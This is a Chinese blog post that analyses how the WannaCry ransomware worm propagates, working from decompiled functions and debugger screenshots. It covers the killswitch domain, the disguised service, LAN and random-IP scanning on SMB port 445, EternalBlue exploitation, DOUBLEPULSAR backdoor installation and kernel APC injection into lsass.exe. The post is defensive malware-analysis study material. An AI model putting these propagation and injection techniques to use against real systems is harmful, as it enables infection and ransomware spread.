> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0uuhNC05zumFijxmjIGXHg)

前文分享了深信服老师的《外部威胁防护和勒索病毒对抗》，带领大家看看知名安全厂商的威胁防护措施。这篇文章将详细讲解 WannaCry 蠕虫的传播机制，带领大家详细阅读源代码，分享 WannaCry 勒索病毒是如何传播感染的。希望文章对您有所帮助~

如果想面试病毒分析工程师或逆向分析工程师，WannaCry 的传播机理是常考的一个知识点，也希望能帮助到那部分同学。而且其强大的功能作者尽最大努力去叙述，只希望能帮助更多该领域的读者，也希望 Github 关注点赞一波。感恩同行，不负遇见。

*   主程序文件利用漏洞传播蠕虫，运行 WannaCry 勒索程序
    
*   WannaCry 勒索程序释放 tasksche.exe，对磁盘文件进行加密勒索
    
*   @WanaDecryptor@.exe 显示勒索信息，运行 TOR 客户端
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKEHJqxVdxZX0V1P0XD3eIjREOHhWibXsFONIDKJOFP0xAwrSu9OnRNjA/640?wx_fmt=png)

  
作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，更希望您能与我一起操作和进步，后续将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！如果文章对您有帮助，将是我创作的最大动力，点赞、评论、私聊均可，一起加油喔~

文章目录：

*   **一. WannaCry 背景**
    
*   **二. WannaCry 传播机制源码详解**
    
    1.WannaCry 蠕虫传播流程
    
    2. 程序入口 Start
    
    3. 域名开关 WinMain
    
    4. 参数判断 sub_408090
    
    5. 蠕虫安装流程 sub_407F20
    
    6. 蠕虫服务传播流程 sub_4080000
    
    7. 蠕虫初始化操作 sub_407B90
    
    8. 局域网传播 sub_407720
    
    9. 公网传播 sub_407840
    
    10. 漏洞检测及创建通信连接 sub_407540
    
    11. 发送 SMB 数据包 sub_4072A0
    
    12. 获取 Payload（dll+shellcode）
    
    13. 提取 shellcode
    
    14.shellcode 分析之安装后门
    
    15.shellcode 分析之 APC 注入
    
    16.dll 导出及分析
    
    17. 释放资源 tasksche.exe
    
    18. 勒索行为
    
*   **三. WannaCry 实验复现**
    
    1. 实验环境搭建
    
    2.Kali 利用 MS17-010 反弹 Shell
    
*   **四. 防御措施**
    
*   **五. 总结**
    

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.htm

作者的 github 资源：

*   逆向分析：
    
    https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：
    
    https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。（参考文献见后）

一. WannaCry 背景
==============

2017 年 5 月 12 日，WannaCry 蠕虫通过永恒之蓝 MS17-010 漏洞在全球范围大爆发，感染大量的计算机。WannaCry 勒索病毒全球大爆发，至少 150 个国家、30 万名用户中招，造成损失达 80 亿美元。

WannaCry 是一种 “蠕虫式” 勒索病毒软件，由不法分子利用 NSA 泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKgHe3MgI4FIZZz9hOAgFCysiaiabOtwPVjYiapKfBFlibPAVWvgoLVysxZA/640?wx_fmt=png)

WannaCry 利用 Windows 系统的 SMB 漏洞获取系统的最高权限，该工具通过恶意代码扫描开放 445 端口的 Windows 系统。WannaCry 利用永恒之蓝漏洞进行网络端口扫描攻击，目标机器被成功攻陷后会从攻击机下载 WannaCry 蠕虫进行感染，并作为攻击机再次扫描互联网和局域网的其他机器，形成蠕虫感染大范围超快速扩散。

其核心流程如下图所示：  

*   木马母体为 **mssecsvc.exe**，运行后会扫描随机 IP 的互联网机器，尝试感染，也会扫描局域网相同网段的机器进行感染传播，此外会释放敲诈者程序 **tasksche.exe**，对磁盘文件进行加密勒索。
    
*   木马加密使用 AES 加密文件，并使用非对称加密算法 RSA 2048 加密随机密钥，每个文件使用一个随机密钥，理论上不可攻破。同时 @WanaDecryptor@.exe 显示勒索界面。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKynwWOxMOGqSeKIZs8b6WjuSbAm9jW2yYQ3ZvmxteomIkEJAZ9XTmtQ/640?wx_fmt=png)

WannaCry 勒索病毒主要行为是传播和勒索。

传播：利用基于 445 端口的 SMB 漏洞 MS17-010(永恒之蓝) 进行传播

勒索：释放文件，包括加密器、解密器、说明文件、语言文件等；加密文件；设置桌面背景、窗体信息及付款账号等。

二. WannaCry 传播机制详解
==================

WannaCry 蠕虫主要分为两个部分：蠕虫部分用于病毒传播，并释放出勒索程序；勒索部分用于加密用户文件索要赎金。

1.WannaCry 蠕虫传播流程
-----------------

WannaCry 运行的整体流程推荐安天公司的框架图，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK0ICiaJY1icGvhgS9tSuLoUGEedgEbCFhvpyb8okz4KgRyoVDjxMxtPsg/640?wx_fmt=png)

其中，图中上半部分为 WannaCry 蠕虫的传播部分，该蠕虫通过网络进行传播，有自我复制和传播迅速等特点。传播步骤如下：

(1) 连接远程域名开关  
(2) 判断参数个数，选择蠕虫安装流程或服务传播流程

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKEfKOgCayEzQHa3nGgvvneAVtRqKN9Qm3Kc5TqL8wq9pibgBUTmGFzvA/640?wx_fmt=png)

作者的分析工具主要是 IDA Pro 静态分析和 OllyDbg 动态调试，大家分析恶意样本一定在虚拟机中，并做好相关安全保护（如断网、物理隔离、共享协议端口关闭等）。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKv6Ow00XhH0DjmibYqSDHKk48FrsOWRxlQQD2UlScUXAMkvsMznTjQoQ/640?wx_fmt=png)

2. 程序入口 Start
-------------

通过 OD 打开样本 wcry.exe，发现程序入口地址为 0x00409A16，对应 start() 函数。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK0rqRsSPeIPTwoK5mtPapH2U2LsCllLkkWvqEkibSsxmdgknBYzRoSdQ/640?wx_fmt=png)

通过一些初始化设置，紧接着会调用 WinMain() 函数进入主程序。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK9RbFvAv1H4nzlmqePFqUPticdExqbib2c71BlrK39mib5NtoJENI4zJ3Q/640?wx_fmt=png)

主程序调用关系如下图所示，调用地址为 0x00409B45。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKHY9NNus7GMiax1ib5XE8ZnmibMSctQN4cnXXbsY65ZwlriavzfdmEMDDUw/640?wx_fmt=png)

3. 域名开关 WinMain
---------------

主程序运行后会先连接域名（KillSwitch）：

hxxp://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com

*   如果该域名连接成功，则直接退出且不触发任何恶意行为
    
*   如果该域名无法访问，则触发传播勒索行为，执行 sub_408090 函数
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKrQ2sTJ70uOPjLcQG5dtibWEGW2fSkTs7soKPibtV85VCP0Yjgic7qGe4g/640?wx_fmt=png)

该代码会调用 InternetOpenUrl 打开对应的网址，并根据其访问情况执行不同的操作。

*   如果网址无法访问，会调用 sub_408090() 函数创建蠕虫服务。这也意味着如果蠕虫作者注册并访问了该 URL，WannaCry 蠕虫也就停止了传播。目前该域名已被英国的安全公司接管，网上怀疑该操作能有效防止在线沙箱检测。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKJdDDR6EgzBZJtjLXibEdqr39sw5uNOfXb5tzba2fHwCxIZd2ZRX8Acg/640?wx_fmt=png)

4. 参数判断 sub_408090
------------------

接着进入 sub_408090 函数，通过判断参数个数来执行相应的流程。

*   sub_407F20 函数
    
    当参数 < 2，进入蠕虫安装流程
    
*   sub_408000 函数
    
    当参数≥2，进入蠕虫服务传播流程并创建 mssecsvc2.0 服务
    

该函数调用了相关的 API 函数，比如创建服务 (OpenSCManagerA)、打开服务(OpenServiceA) 等。

*   当我们直接运行 wcry.exe 时，传递的参数是 1（程序本身），则进入蠕虫安装程序；当我们传递参数 3（程序本身、二进制程序、服务参数）时，则进入蠕虫服务传播流程。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKTP0Lp3WYiaTaX8qG4WBiaebyVh4AtfZG0s8lEQLPC8ZLBDf5ZacpBRIQ/640?wx_fmt=png)

mssecsvc2.0 服务对应的数据部分如下图所示，该服务会伪装成微软安全中心的服务，服务的二进制文件路径为当前进程文件路径，参数为 “**-m security**”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKCmBIic4JVfuliamSQsicVIzQ5LU3ViapmZtt8Inv7ZLLXxniaiaObLqQcQwA/640?wx_fmt=png)

OD 动态调试如下图所示，包括调用 CALL 访问函数，将服务 PUSH 入栈等。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKvicw68edBNEsOU1AdVEOT86UbrUX84UNOsdiafqQrTf5zsZH5yGoRSBg/640?wx_fmt=png)

5. 蠕虫安装流程 sub_407F20
--------------------

蠕虫安装流程主要调用 sub_407F20 函数，包括 sub_407C40 和 sub_407CE0。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKjkAYt7ndWVKJU62V9MPPSxYUog3zkzJw7ComjeRcQibM2fbYdgEzz5Q/640?wx_fmt=png)

(1) sub_407C40：创建 mssecsvc2.0 服务，并启动该服务，参数为”-m security”，蠕虫伪装为微软安全中心。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK9O6dw7qIshyHAZDSS3hMW3pdXomOlgueia9m2bFiafvYqpgz8eOtZkEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKIjBxNYEwzSjq43GdmVXEEomaetjliaTT5A7qxsmWstGicrtgsov48tmA/640?wx_fmt=png)

(2) sub_407CE0：读取并释放资源 tasksche.exe 至 C:\Windows 路径，创建线程运行。

主要调用的函数包括 GetProcAddress、MoveFileEx、CreateFile 等。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKenF7HdLaE8Ph2EoeYmebAj69aFJ6o4pDnZvtxHYTXA8q8BcAgPuhqw/640?wx_fmt=png)

动态调用过程如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKhTqicxUKzjNuIWKQSzegAZbxbtvRCPaaLKtzGQJzuqjHQrO43ibytYZg/640?wx_fmt=png)

释放的 C:\Windows\tasksche.exe 效果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKQWQswDibJSGqXVT80RRaH4QkgHvFKt9njkALPlRnicBxiaQSjI5Fx2pAA/640?wx_fmt=png)

6. 蠕虫服务传播流程 sub_4080000
-----------------------

当参数≥2 时，蠕虫执行服务传播流程，调用 sub_4080000 实现，其代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKXEDdZD2GvB1fK8iaBIn73vic9A5YMEWO24gmbGyaUGPHebEJic98P9dAw/640?wx_fmt=png)

sub_4080000 会打开 mssecsvc2.0 服务并设置其状态，服务设置函数包括：

*   RegisterServerCtrlHandlerA
    
*   SetServiceStatus
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK75SNj7MfsrxTXkPk7ysAzsxpEic6LiaaNeD3oYC6JcoPg0MSweH5TFOA/640?wx_fmt=png)

动态分析过程如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKUqbDlPlfo9KcupxCM7xA2LzIo6fKsuoxhRgtn6fQOKPvlMwbosoribw/640?wx_fmt=png)

核心函数是 sub_407BD0，它的功能包括：

*   初始化操作
    
*   局域网传播
    
*   公网传播
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKzna7DECKJR9seGUSKsdicGg9OyMxBhI9o54btEuBLXmQe68rvNTpzvw/640?wx_fmt=png)

7. 蠕虫初始化操作 sub_407B90
---------------------

蠕虫初始化操作主要调用 sub_407B90 函数实现，具体功能包括：

*   WSAStartup：初始化网络
    
*   sub_407620：初始化密码
    
*   sub_407A20：获取 Payload
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKSAzfxsTzQbmib6hlRVsEQbu5xkpib5RH0RBcHryPeIzv6RkffrberwZw/640?wx_fmt=png)

函数 WSAStartup 主要是进行相应的 Socket 库绑定。函数原型如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKFlOaS4iaETUeEW8dnQC6jbTHZgu5xIwcRN4KHoZcdbfzhYQdee2bP4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK6IgPpSM5P9I0OP0xZiaO9ITwcNwb5JG1CxqAQJBoMXosrBICQ22r22Q/640?wx_fmt=png)

继续调用 sub_407A20 函数从内存中读取 MS17-010 漏洞利用代码，Payload 分为 x86 和 x64 两个版本，32 位大小为 0x4060，64 位大小为 0xc8a4。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKibPZBWtx9KvKyXlcfdgIlu16h6NXGiahtpEdROQ1HX27zf3DfYrFFXlg/640?wx_fmt=png)

8. 局域网传播 sub_407720
-------------------

蠕虫初始化操作后，会生成两个线程，分别进行局域网和公网传播。

```
result = sub_407B90
v1 = (void *)beginthreadex(0, 0, sub_407720, 0, 0, 0)
v3 = (void *)beginthreadex(0,0, sub_407840, v2, 0, 0)
```

局域网传播：

*   蠕虫根据用户内网 IP，生成覆盖整个局域网网段表，然后循环尝试攻击
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKRXIl0lBY7l23GicLAswzbzicBn2crSbemibfJ6GId4921iaP2WkGvUcI6A/640?wx_fmt=png)

这里存在一个疑问：你怎么能确定 v1 是局域网传播，而 v3 是外网传播呢？

*   在函数 sub_407720 中，会继续调用线程执行 sub_4076B0 函数。同时，函数如果同时调用 10 个以上 IP 地址，会执行 Sleep 暂停 100 毫秒（1 秒 = 1000 毫秒）。
    

核心函数：sub_4076B0

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKxWJgIWRqrR7BJcPC1iaJTqNWFmDUYr062UdXTamxsBcTcBUJxvPALww/640?wx_fmt=png)

*   函数 sub_407720 会调用函数 sub_409160，接着调用 GetAdaptersInfo 获取网卡配置和 IP 地址详细信息，最终进行局域网 IP 地址拼接和传播。
    
*   而外网传播的 IP 地址是通过四个随机数产生的，通过这些差异就能判断是局域网传播还是外网传播。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK6Zs0dmib2ziakpLqAvjuBXzgfNVKRo1z2FhXPzMib9sQWRM6CVGdxxFNQ/640?wx_fmt=png)

函数 sub_4076B0 会连接 445 端口，如果 445 端口连接成功，接着发起漏洞攻击。如果连接超过 10 分钟则终止该线程。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKEmE1OHD52E8Vqt5ica03G9ZpmWHHIe6wd0CpkC3uWN9ia9zQM7JEj8mA/640?wx_fmt=png)

接下来调用 sub_407540 函数发起漏洞攻击。

*   核心函数：sub_407540
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKFHj2ZypDVKRIhic8kj2btS9SEiaicla6IKKCPoDZGAu5atg09sKHHBwbg/640?wx_fmt=png)

9. 公网传播 sub_407840
------------------

公网传播：公网 IP 地址通过 4 个随机数拼接而成，然后循环尝试攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKRXIl0lBY7l23GicLAswzbzicBn2crSbemibfJ6GId4921iaP2WkGvUcI6A/640?wx_fmt=png)

sub_407840 函数：

*   生成四个随机数，然后调用 aDDDD 进行 IP 拼接，表示成 %d.%d.%d.%d。0xFF 表示 255，对应最大地址，v8 余数不等于 127 内网。接着调用 sub_407540 函数进行外网传播。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKYWOPDlDHj3LTcfI2UOyGnB7wrZ2nwZ8te4icth0lhr0Ll15kJic8Da2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK7Zyxia4AvhEibqIRtiaiczG2MCH5dUKg31xSk0ncHEqnr0WDGI5a1S1Jqg/640?wx_fmt=png)

在 sub_407840 函数中，继续调用线程执行 sub_407540 函数，该函数为漏洞利用核心函数。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKtxia64tmTjZw058g7mh4xR4lDSONA4ecpvMx9xOjaibBJ7zC69xvbCcg/640?wx_fmt=png)

10. 漏洞检测及创建通信连接 sub_407540
--------------------------

IP 地址拼接好后，会创建漏洞利用线程，调用 sub_407540 函数。

第一步：检测目标是否可以安装双星脉冲 DOUBLEPULSAR(端口 445)

如果需要，后续可以分享一篇永恒之蓝和双星脉冲相关知识。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKq7oBT0N5BBic15n4PyL7liaF8Qib2QxG6lbATtkBH0cep3d23raduxCrA/640?wx_fmt=png)

第二步：利用 MS17-010 漏洞，尝试建立通信连接并发送漏洞利用程序数据包

通过 connet 建立 Socket 通信连接，再调用 send 和 recv 进行数据包握手确认。最后会调用核心函数 sub_406F50。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKSOdqIJiav3Acys4FsjZo1AGCrOMWIcJcjRqSibudG11vRtAOYUNaxwuw/640?wx_fmt=png)

11. 发送 SMB 数据包 sub_4072A0
-------------------------

建立通信连接 (connect、send、recv)，发送利用 Eternalblue 的蠕虫 SMB 数据包。具体流程包括：（还需进一步分析）

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKD8FzSBDD3V7Jl1edqAHvbVgCtPekibYO5K089G3DASzrDdodUh22mrw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK25iaIMh1VhJS65cmBYjSVmlfEChibuWbGverAZBZyDu2ZMHMyL8ppCQA/640?wx_fmt=png)

12. 获取 Payload（dll+shellcode）
-----------------------------

样本在利用漏洞 MS17-010 获取目标主机权限后，并不会直接发送蠕虫自身到目标，而是发送一段经过简单异或加密后的 Payload 到目标机器中执行。

在 sub_4077A0 函数中，v7 是系统标记，当 v7 等于 1 时表示 32 位操作系统，当 v7 等于 0 时表示 64 位操作系统。

核心函数：sub_406F50（发送 Payload）

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKVlSrNJm57z4qNbUkNEWSjcGF3VEsHoLYyic2091hFmhP5U2BoYTsX3A/640?wx_fmt=png)

Payload 由 shellcode 和包含样本自身的 dll 组成，Payload 分为 64 位与 32 位，函数 sub_406F50 如下图所示。

*   32 位 shellcode 起始地址 0x42E758
    
*   64 位 shellcode 起始地址 0x42FA60
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKQV5AyDWWrgCQToeYeG1gZOYZ1kPxJZW4YSAmlURJsOZ7xb9pRAezSQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKwfuKtd9Y6eSOib1gFRWouUI84icK8TGzWusHwSMyutjO2xT06Ye24GSQ/640?wx_fmt=png)

dll 同样分为 64 位与 32 位版本，根据目标主机系统的不同，读取不同版本的 dll

*   32 位 dll 起始地址 0x40B020，大小为 0x4060 字节
    
*   64 位 dll 起始地址 0x40F080，大小为 0xc8a4 字节
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKwC5H8QkkhhUbF5tsmhjDIS5J1pgf2cojK44icnLZRp1FAIjVuTtt8OA/640?wx_fmt=png)

Shellcode 相关信息

*   32 位 shellcode 起始地址 0x42E758，大小为 0x1305 字节
    
*   64 位 shellcode 起始地址 0x42FA60，大小为 0x1800 字节
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKbm71gUGlo3w4fwUXrZOnFK54eLibXGHrWpZ53Xf5hXMuw2CMuClwA1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK6HCVmc61kN8NdbhS6nmNicUsEKZAstu5TYsibN1dx0VhdaUvnrkzOIVA/640?wx_fmt=png)

13. 提取 shellcode
----------------

对应的反汇编代码如下，包括 x64_payload_addr、x86_payload_addr。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKzFia1CzAqUDpAuvZaaibABvKicZZJic6LX3DtYB2uCj7IjPZSoEWnQPGUQ/640?wx_fmt=png)

32 位 Shellcode 获取：

*   0x42E758~0x42FA5D
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKCszkozdm1CXzSfPyUuoicFULKMeazicnpoGSL5xicbAISlQ3Noh6ZXChw/640?wx_fmt=png)

64 位 Shellcode 提取：

*   0x42FA60~0x43125F
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKGolqH2EYibF1MQxLZfLJ3Ol38QDzbWc3GHTejRPib2hJRlmjD2qekI7w/640?wx_fmt=png)

14.shellcode 分析之安装后门
--------------------

Shellcode 反汇编及功能分析如下：

第一部分：安装后门

第二部分：利用安装的后门，APC 向应用程序注入 dll

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKiaa6LZCEC2fGUuibNPVXlx88SvOaumlKe7PKzMpLt86a7ibNUrcicINhlg/640?wx_fmt=png)

> shellcode 部分作者还需要进一步研究，加油~

安装后门主要执行 sub_401370 函数，在远程电脑上安装双星脉冲 DOUBLEPULSAR 后门。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKAPt8bRrOQGrUn3lRiajjDlVTKhMbolEI5GmfMs9b6JrsTl6NZfvibbfA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKwuibvYHOVXWb1Fl8wMictpTuicicYEC5qldcR8RESibq5n85cibbVvfiaUVog/640?wx_fmt=png)

15.shellcode 分析之 APC 注入
-----------------------

> 参考两篇文章：  
> [原创]WannaCry 勒索软件中 “永恒之蓝” 漏洞利用分析 - 展博  
> [原创] 通过 Wannacry 分析内核 shellcode 注入 dll 技术 - dragonwang

shellcode 第二部分是利用安装的后门，APC 向应用程序注入 dll。

(1) 查找 ntoskrnl.exe 基地址  
首先找到 gs[38] 处的_KIDTENTRY64 指针，在 KIDTENTRY64 的偏移 4，得到中断处理的函数指针，这个地址在 ntoskrnl.exe 中，我们就找到了 ntoskrnl.exe 的地址空间，然后去地址空间的页头地址对比 PE 头 MZ，找到则函数返回。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK2mViboaib68sWIcuQFLVDI5MnYj16CoQ4lia77XZP48ibHy5QYrpOPJUyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK69QtcvNmOTFsIiaBNpRLQg0SJH6xicNBa6cpOKaYNicF3wtndabttIxrw/640?wx_fmt=png)

(2) 获取 Hash 计算方法

*   需要使用的函数并没有硬编码写到程序里，而是硬编码了这些函数的 hash 值。所以我们需要首先知道函数编码和 hash 值得对应关系。Hash 计算方法如下，用 c++ 代码注释了一下。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKwux9dwjgXcmNOZPM7dliasSia1icYwYhgXIL9mrNxsJ9ibnUoZBs4ZrF2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKicT0NygjtRCM5icbJ3AHXl09u1WPVZf92fgBF4jTsRUkpibCIXfJZ3WjQ/640?wx_fmt=png)

(3) 根据 ntoskrnl.exe 基地址、函数 hash 字符查找导出函数地址

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKAldPgRb8ZdBSEnRAbiaKZkb6WEZW6DOH83XOwtLTtkhMLA71iawHosqQ/640?wx_fmt=png)

find_func 函数如下，有了 ntoskrnl.exe 所有导出函数 hash 对照表，整个程序流程就明朗了。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKicSDQyicu2tuyE7iclbFgPy7BwjFUJYhAdz8LPIxI7o1ibWOVTOAibdCuxA/640?wx_fmt=png)

(4) 查找需要用到 ntoskrnl.exe 导出函数地址并保存备用

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKMHB4v8gXvnUVBxAZibrAu8qZqLVghkQLfjqcR4xb4qgRdCLlrYzXMpA/640?wx_fmt=png)

(5) 查找目标进程，通过 hash 编码 782BF0E7h 进程名查找（lsass.exe）

*   查找目标进程，通过 hash 编码 782BF0E7h 进程名查找，直接没找到 “lsass.exe”，查找方法是使用 pid 暴力查找。具体通过 pid 调用 PsLookupProcessByProcessId 得到 pEProcess 结构指针，再通过 pEProcess 调用 PsGetProcessImageFileName 得到进程名。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKVf3HU2IXKZTicyMH2PsxUoianaCbk6Me2OThvGPsOfMn12spZK5gOv0w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKN6ucgM7ianTINiaZKKBm9r8N1XbXhjuZcMw6V2jWVu2brPl6C7hTyKgA/640?wx_fmt=png)

(6) 使用查到导出函数的地址，并进行 APC 注入

*   APC 注入，使用查到导出函数的地址，注释见截图。第六个参数包含了第三层 shellcode 和 dll 代码，可自行 dump 出研究，第七个参数指定为 usermode。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKicha7IdV1HVnWP8vSQ0B7mkXVnuUJhMVTtxJ72D8T6Ar06UDbKokibnQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKrNEzfZWl6icI5JlvqG0VBJibNjyDSBhzDFCQOlxlNSIf6efeTib0AMzOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKID4VTGjOHYeEwHnjuB00LvmibiaO0dDw4MGSnKRtE01ibGhKxQBnnhhgA/640?wx_fmt=png)

(7) 最后将 shellcode 自身以及其所分配的内存清 0

